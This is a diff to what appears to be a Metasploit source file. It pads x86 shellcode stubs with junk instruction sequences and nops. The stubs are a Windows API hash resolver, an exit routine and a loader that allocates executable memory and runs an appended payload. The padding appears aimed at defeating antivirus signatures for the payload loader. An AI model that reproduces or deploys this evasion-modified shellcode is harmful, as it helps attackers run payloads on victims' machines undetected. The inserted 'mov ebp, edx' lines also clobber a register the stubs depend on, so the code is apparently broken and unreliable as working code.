@@ -1645,89 +1645,336 @@ require 'msf/core/exe/segment_appender'
       pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
       mov ebp, esp           ; Create a new stack frame
       xor edx, edx           ; Zero EDX
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       mov edx, [fs:edx+48]   ; Get a pointer to the PEB
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
+      nop
       mov edx, [edx+12]      ; Get PEB->Ldr
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
+      nop
+      inc edx
+      dec edx
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
     next_mod:                ;
       mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
       movzx ecx, word [edx+38] ; Set ECX to the length we want to check
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
+      nop
       xor edi, edi           ; Clear EDI which will store the hash of the module name
     loop_modname:            ;
       xor eax, eax           ; Clear EAX
       lodsb                  ; Read in the next byte of the name
+      nop
       cmp al, 'a'            ; Some versions of Windows use lower case module names
       jl not_lowercase       ;
       sub al, 0x20           ; If so normalise to uppercase
     not_lowercase:           ;
       ror edi, 13            ; Rotate right our hash value
       add edi, eax           ; Add the next byte of the name
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
+      nop
       ;loop loop_modname      ; Loop until we have read enough
       ; The random jmps added below will occasionally make this offset
       ; greater than will fit in a byte, so we have to use a regular jnz
       ; instruction which can take a full 32-bits to accomodate the
       ; bigger offset
       dec ecx
+      nop
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       jnz loop_modname        ; Loop until we have read enough
+      nop
       ; We now have the module hash computed
       push edx               ; Save the current position in the module list for later
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       push edi               ; Save the current module hash for later
       ; Proceed to iterate the export address table,
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       mov edx, [edx+16]      ; Get this modules base address
       mov eax, [edx+60]      ; Get PE header
+      nop
+      nop
+      nop
       add eax, edx           ; Add the modules base address
       mov eax, [eax+120]     ; Get export tables RVA
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       test eax, eax          ; Test if no export address table is present
       jz get_next_mod1       ; If no EAT present, process the next module
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       add eax, edx           ; Add the modules base address
       push eax               ; Save the current modules EAT
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       mov ecx, [eax+24]      ; Get the number of function names
+      nop
+      nop
+      nop
+      nop
       mov ebx, [eax+32]      ; Get the rva of the function names
       add ebx, edx           ; Add the modules base address
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       ; Computing the module hash + function hash
     get_next_func:           ;
       test ecx, ecx          ; Changed from jecxz to accomodate the larger offset produced by random jmps below
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       jz get_next_mod        ; When we reach the start of the EAT (we search backwards), process the next module
       dec ecx                ; Decrement the function name counter
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       mov esi, [ebx+ecx*4]   ; Get rva of next module name
+      nop
+      nop
+      nop
       add esi, edx           ; Add the modules base address
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       xor edi, edi           ; Clear EDI which will store the hash of the function name
       ; And compare it to the one we want
     loop_funcname:           ;
       xor eax, eax           ; Clear EAX
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       lodsb                  ; Read in the next byte of the ASCII function name
       ror edi, 13            ; Rotate right our hash value
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       add edi, eax           ; Add the next byte of the name
+      nop
+      nop
+      nop
       cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       jne loop_funcname      ; If we have not reached the null terminator, continue
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       add edi, [ebp-8]       ; Add the current module hash to the function hash
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       jnz get_next_func      ; Go compute the next function hash if we have not found it
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       ; If found, fix up stack, call the function and then value else compute the next one...
       pop eax                ; Restore the current modules EAT
+      nop
+      nop
+      nop
       mov ebx, [eax+36]      ; Get the ordinal table rva
       add ebx, edx           ; Add the modules base address
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       mov ebx, [eax+28]      ; Get the function addresses table rva
+      nop
+      nop
+      nop
       add ebx, edx           ; Add the modules base address
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       add eax, edx           ; Add the modules base address to get the functions actual VA
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       ; We now fix up the stack and perform the call to the desired function...
     finish:
       mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad
       pop ebx                ; Clear off the current modules hash
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       pop ebx                ; Clear off the current position in the module list
+      nop
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
+      nop
       popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
       pop ecx                ; Pop off the origional return address our caller will have pushed
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       pop edx                ; Pop off the hash value our caller will have pushed
+      nop
+      nop
+      nop
       push ecx               ; Push back the correct return value
       jmp eax                ; Jump into the required function
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       ; We now automagically return to the correct caller...
+      nop
+      nop
     get_next_mod:            ;
       pop eax                ; Pop off the current (now the previous) modules EAT
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
     get_next_mod1:           ;
       pop edi                ; Pop off the current (now the previous) modules hash
       pop edx                ; Restore our position in the module list
+      nop
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
+      nop
       mov edx, [edx]         ; Get the next module
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       jmp next_mod           ; Process this module
     ^
 
@@ -1739,26 +1986,95 @@ require 'msf/core/exe/segment_appender'
 
     exitfunk:
       mov ebx, 0x0A2A1DE0    ; The EXITFUNK as specified by user...
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       push 0x9DBD95A6        ; hash( "kernel32.dll", "GetVersion" )
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       mov eax, ebp
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       call eax               ; GetVersion(); (AL will = major version and AH will = minor version)
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       jl goodbye             ; Then just call the exit function...
+      nop
+      nop
+      nop
+      nop
+      nop
       cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       jne goodbye      ;
+      nop
       mov ebx, 0x6F721347    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
     goodbye:                 ; We now perform the actual call to the exit function
       push byte 0            ; push the exit function parameter
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       push ebx               ; push the hash of the exit function
+      nop
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       call ebp               ; call EXITFUNK( 0 );
     ^
 
     stub_alloc = %Q^
       cld                    ; Clear the direction flag.
+      nop
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
+      nop
       call start             ; Call start, this pushes the address of 'api_call' onto the stack.
     delta:                   ;
     #{stub_block}
     start:                   ;
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       pop ebp                ; Pop off the address of 'api_call' for calling later.
 
     allocate_size:
@@ -1766,33 +2082,124 @@ require 'msf/core/exe/segment_appender'
 
     allocate:
       push byte 0x40         ; PAGE_EXECUTE_READWRITE
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       push 0x1000            ; MEM_COMMIT
+      nop
+      nop
+      nop
+      nop
+      nop
+      nop
       push esi               ; Push the length value of the wrapped code block
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       push byte 0            ; NULL as we dont care where the allocation is.
+      nop
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
+      nop
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
       mov ebx, eax           ; Store allocated address in ebx
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       mov edi, eax           ; Prepare EDI with the new address
+      nop
+      nop
+      nop
       mov ecx, esi           ; Prepare ECX with the length of the code
       call get_payload
     got_payload:
       pop esi                ; Prepare ESI with the source to copy
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       rep movsb              ; Copy the payload to RWX memory
+      nop
+      nop
+      nop
+      nop
+      nop
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       call set_handler       ; Configure error handling
 
     exitblock:
     #{stub_exit}
     set_handler:
       xor eax,eax
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       push dword [fs:eax]
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
+      nop
+      nop
+      nop
       mov dword [fs:eax], esp
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       call ebx
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       jmp exitblock
     ^
 
     stub_final = %Q^
     get_payload:
+      push edx
+      inc edx
+      dec edx
+      mov ebp, edx
+      xor edx, edx
+      pop edx
       call got_payload
     payload:
     ; Append an arbitrary payload here
